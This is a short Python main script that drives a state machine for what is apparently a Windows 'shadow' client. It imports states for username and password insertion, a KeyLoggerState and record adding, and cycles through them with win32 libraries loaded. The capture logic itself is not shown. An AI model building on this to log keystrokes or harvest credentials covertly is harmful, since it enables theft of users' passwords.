"""
name:
date:
description
"""
from client.ShadowStates.AddRecord import AddRecord
from client.ShadowStates.KeyLogger import KeyLoggerState
from client.ShadowStates.ShadowInsertPassword import ShadowInserPasswordState
from client.ShadowStates.ShadowInsertUsername import ShadowInserUsername
from client.window_order import shadow_fsm
import win32api, win32gui, win32con
import sys
import threading

SHADOW_FSM_TO_CLASS = {'insert_username': ShadowInserUsername, 'insert_password': ShadowInserPasswordState,
                       'key_logger': KeyLoggerState, 'add_record': AddRecord}


def main():
    last_state = None
    while not shadow_fsm.is_finished():
        state = SHADOW_FSM_TO_CLASS[shadow_fsm.current]
        if last_state is not None:
            state.get_data(last_state.pass_data())
        state.on_press()
        last_state = state


if __name__ == '__main__':
    main()
